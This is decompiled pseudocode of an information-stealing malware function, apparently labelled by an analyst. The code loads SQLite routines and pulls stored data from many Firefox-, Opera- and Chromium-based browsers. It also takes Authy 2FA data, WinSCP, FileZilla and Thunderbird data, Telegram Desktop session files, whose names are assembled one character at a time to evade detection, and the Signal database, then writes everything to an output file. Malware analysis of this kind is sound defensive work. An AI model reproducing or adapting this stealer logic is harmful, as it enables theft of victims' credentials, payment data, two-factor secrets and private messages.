// #STR: "Telegram", "BC10B77*", "A7FDF864F", "A6F891F2*", "A92DAA6E", "C461824F*", "F8806DD0", "\\Signal\\sql\\", "Signal\\sql", "db.sqlite"
void *__usercall vdr_steal_browsers_data_messaging_data_creditcard_data@<eax>(char *a1@<ecx>, int a2, int a3)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  v3 = a1;
  v20 = a1;
  memset(a4, 0, sizeof(a4));
  v3[3] = 0;
  v3[4] = 0;
  v3[2] = 0;
  v3[6] = 0;
  v3[5] = 0;
  v3[7] = 0;
  v17 = a2;
  v18 = a3;
  a1a = operator new(0x20u);
  if ( sub_40475B(a1a, &v17) )
  {
    memset(&a1a, 0, sizeof(a1a));
  }
  else
  {
    v4 = a1a;
    if ( a1a )
    {
      str_sqlite3_prepare_v2_0 = sub_4048CC(a1a, str_sqlite3_prepare_v2);
      str_sqlite3_step_0 = sub_4048CC(v4, str_sqlite3_step);
      str_sqlite3_close_0 = sub_4048CC(v4, str_sqlite3_close);
      str_sqlite3_column_text_0 = sub_4048CC(v4, str_sqlite3_column_text);
      str_sqlite3_column_blob_0 = sub_4048CC(v4, str_sqlite3_column_blob);
      str_sqlite3_open_0 = sub_4048CC(v4, str_sqlite3_open);
      str_sqlite3_column_bytes_0 = sub_4048CC(v4, str_sqlite3_column_bytes);
      str_sqlite3_finalize_0 = sub_4048CC(v4, str_sqlite3_finalize);
    }
  }
  vdr_steal_Mozilla_based_browser_data(str_Mozilla_Firefox_Profiles_path, v3, str_Mozilla_Firefox, a4);
  vdr_steal_Mozilla_based_browser_data(str_Moonchild_Productions_Pale_Moon_Profiles_path, v3, str_Pale_Moon, a4);
  vdr_steal_data_of_Opera_based_browser(v3, str_Opera, dword_447060, a4);
  vdr_steal_data_of_Opera_based_browser(v3, str_OperaGX, dword_446AC0, a4);
  vdr_steal_data_of_Chromium_based_browser(str_Google_Chrome_User_Data_path, v3, str_Google_Chrome, a4);
  vdr_steal_data_of_Chromium_based_browser(str_Chromium_User_Data_path, v3, str_Chromium, a4);
  vdr_steal_data_of_Chromium_based_browser(str_Amigo_User_Data_path, v3, str_Amigo, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_446EC8, v3, str_Torch, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_447274, v3, str_Vivaldi, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_446A6C, v3, dword_44717C, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_446E40, v3, dword_4470A4, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_44706C, v3, str_CocCoc, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_446C2C, v3, str_Brave_Old, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_446C4C, v3, dword_446BA8, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_446EF4, v3, str_7Star, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_446A98, v3, dword_4471B0, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_446B84, v3, dword_446AD4, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_446FFC, v3, dword_44727C, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_44701C, v3, dword_446B64, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_446A44, v3, str_QQBrowser, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_4470C8, v3, dword_446AF0, a4);
  vdr_steal_data_of_Chromium_based_browser(dword_446AB4, v3, str_Brave, a4);
  if ( *v3 )
  {
    vdr_steal_Authy_2FA_data(v3);
    if ( *v3 )
    {
      vdr_steal_WinSCP_data(a4);
      vdr_steal_Mozilla_based_browser_data(sz_folder_path, v3, str_Thunderbird, a4);
      vdr_steal_FileZilla_data(a4);
    }
  }
  if ( *(v3 + 5) )
  {
    memset(sz_Telegram_Desktop_path, 0, 0x104u);
    memset(String1, 0, 0x104u);
    memset(v26, 0, 0x104u);
    v5 = vdr_retrieve_folder_path_based_on_csidl_value(CSIDL_APPDATA);
    lstrcatA(sz_Telegram_Desktop_path, v5);
    lstrcatA(sz_Telegram_Desktop_path, L"\\");
    lstrcatA(sz_Telegram_Desktop_path, "T");
    lstrcatA(sz_Telegram_Desktop_path, "e");
    lstrcatA(sz_Telegram_Desktop_path, "l");
    lstrcatA(sz_Telegram_Desktop_path, "e");
    lstrcatA(sz_Telegram_Desktop_path, "g");
    lstrcatA(sz_Telegram_Desktop_path, "r");
    lstrcatA(sz_Telegram_Desktop_path, "a");
    lstrcatA(sz_Telegram_Desktop_path, "m");
    lstrcatA(sz_Telegram_Desktop_path, " ");
    lstrcatA(sz_Telegram_Desktop_path, "D");
    lstrcatA(sz_Telegram_Desktop_path, "e");
    lstrcatA(sz_Telegram_Desktop_path, "s");
    lstrcatA(sz_Telegram_Desktop_path, "k");
    lstrcatA(sz_Telegram_Desktop_path, "t");
    lstrcatA(sz_Telegram_Desktop_path, "o");
    lstrcatA(sz_Telegram_Desktop_path, "p");
    lstrcatA(sz_Telegram_Desktop_path, L"\\");
    lstrcatA(String1, "k");
    lstrcatA(String1, "e");
    lstrcatA(String1, "y");
    lstrcatA(String1, "_");
    lstrcatA(String1, "d");
    lstrcatA(String1, "a");
    lstrcatA(String1, "t");
    lstrcatA(String1, "a");
    lstrcatA(String1, "s");
    lstrcatA(v26, "D");
    lstrcatA(v26, "8");
    lstrcatA(v26, "7");
    lstrcatA(v26, "7");
    lstrcatA(v26, "F");
    lstrcatA(v26, "7");
    lstrcatA(v26, "8");
    lstrcatA(v26, "3");
    lstrcatA(v26, "D");
    lstrcatA(v26, "5");
    lstrcatA(v26, "D");
    lstrcatA(v26, "3");
    lstrcatA(v26, "E");
    lstrcatA(v26, "F");
    lstrcatA(v26, "8");
    lstrcatA(v26, "C");
    lstrcatA(v26, "*");
    vdr_recursive_steal_Telegram_Signal_data(v20, ::a2, sz_Telegram_Desktop_path, String1, "Telegram");
    vdr_recursive_steal_Telegram_Signal_data(v20, ::a2, sz_Telegram_Desktop_path, v26, "Telegram");
    v6 = std::string::string(&v22, "p*");
    v28 = 0;
    v7 = sub_404D65(&sdtStr, "ma", v6);
    LOBYTE(v28) = 1;
    if ( v7[5] >= 0x10u )
    {
      v7 = *v7;
    }
    vdr_recursive_steal_Telegram_Signal_data(v20, ::a2, sz_Telegram_Desktop_path, v7, "Telegram");
    std::string::_Tidy(&sdtStr, 1, 0);
    v28 = 0xFFFFFFFF;
    std::string::_Tidy(&v22, 1, 0);
    v8 = std::string::string(&sdtStr, "BC10B77*");
    v28 = 2;
    v9 = sub_404D65(&v22, "A7FDF864F", v8);
    LOBYTE(v28) = 3;
    if ( v9[5] >= 0x10u )
    {
      v9 = *v9;
    }
    vdr_recursive_steal_Telegram_Signal_data(v20, ::a2, sz_Telegram_Desktop_path, v9, "Telegram");
    std::string::_Tidy(&v22, 1, 0);
    v28 = 0xFFFFFFFF;
    std::string::_Tidy(&sdtStr, 1, 0);
    v10 = std::string::string(&sdtStr, "A6F891F2*");
    v28 = 4;
    v11 = sub_404D65(&v22, "A92DAA6E", v10);
    LOBYTE(v28) = 5;
    if ( v11[5] >= 0x10u )
    {
      v11 = *v11;
    }
    vdr_recursive_steal_Telegram_Signal_data(v20, ::a2, sz_Telegram_Desktop_path, v11, "Telegram");
    std::string::_Tidy(&v22, 1, 0);
    v28 = 0xFFFFFFFF;
    std::string::_Tidy(&sdtStr, 1, 0);
    v12 = std::string::string(&sdtStr, "C461824F*");
    v28 = 6;
    v13 = sub_404D65(&v22, "F8806DD0", v12);
    LOBYTE(v28) = 7;
    if ( v13[5] >= 0x10u )
    {
      v13 = *v13;
    }
    vdr_recursive_steal_Telegram_Signal_data(v20, ::a2, sz_Telegram_Desktop_path, v13, "Telegram");
    std::string::_Tidy(&v22, 1, 0);
    v28 = 0xFFFFFFFF;
    std::string::_Tidy(&sdtStr, 1, 0);
    v3 = v20;
  }
  if ( *(v3 + 7) )
  {
    memset(v24, 0, sizeof(v24));
    v14 = vdr_retrieve_folder_path_based_on_csidl_value(CSIDL_APPDATA);
    lstrcatA(v24, v14);
    lstrcatA(v24, "\\Signal\\sql\\");
    vdr_recursive_steal_Telegram_Signal_data(v3, ::a2, v24, "db.sqlite", "Signal\\sql");
  }
  v3[3] = dword_4472EC;
  v3[4] = dword_4472F8;
  v15 = lstrlenA(a4);
  vdr_create_file(v3[8], a4, file_name_info, v15, 3);
  return memset(a4, 0, sizeof(a4));
}
